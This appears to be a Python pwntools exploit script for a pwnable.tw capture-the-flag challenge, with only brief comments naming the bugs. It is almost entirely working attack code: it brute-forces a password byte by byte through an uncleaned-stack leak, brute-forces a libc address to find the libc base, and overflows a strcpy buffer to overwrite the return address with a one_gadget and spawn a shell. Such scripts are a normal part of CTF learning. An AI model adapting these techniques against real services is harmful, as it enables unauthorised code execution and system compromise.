###Overlapping non-cleaned stack + strlen leading to information leak byte by byte
###strcpy lead to overflow

from pwn import *


###Utils
def login(data):
    r.sendlineafter('>> ','1')
    r.sendafter('passowrd :',data)

def logout():
    r.sendlineafter('>> ','1')

def leave():
    r.sendlineafter('>> ','2')

def magic(data):
    r.sendlineafter('>> ','3')
    r.sendafter('Copy :',data)

###Useful addr
_IO_file_setbuf_offset = 0x78430   #test rax rax offset -> 0x78439
one_gadget = 0xf0567


###Exploit
r = remote('chall.pwnable.tw',10205)

###Leak pwd
pwd = b''
for i in range(0x10):
    print(i)
    for j in range(0x1,0x100):
        pay = p8(j)
        login(pwd+pay+b'\x00')
        if b'Success' in r.recvuntil('!'):
            pwd+=pay
            logout()
            break

###Construct strcpy buf_overflow payload
login('\x00'.ljust(0x48,'a'))
magic('a')
logout()

###Leak libc
###Add known address to speed up bruteforce
_IO_file_setbuf_addr = b'\x39'
for i in range(4):
    for j in range(0x1,0x100):
        pay = p8(j)
        login(b'a'*0x8+_IO_file_setbuf_addr+pay+b'\x00')
        if b'Success' in r.recvuntil('!'):
            _IO_file_setbuf_addr+=pay
            logout()
            break
_IO_file_setbuf_addr += b'\x7f'
_IO_file_setbuf_addr = u64(_IO_file_setbuf_addr.ljust(8,b'\x00'))
libc_base = _IO_file_setbuf_addr-_IO_file_setbuf_offset-0x9

###Overwrite ret addr & fill back pwd
login((b'\x00'.ljust(0x40,b'a')+pwd).ljust(0x68,b'a')+p64(libc_base+one_gadget))
magic('a')

###get shell
leave()
r.interactive()
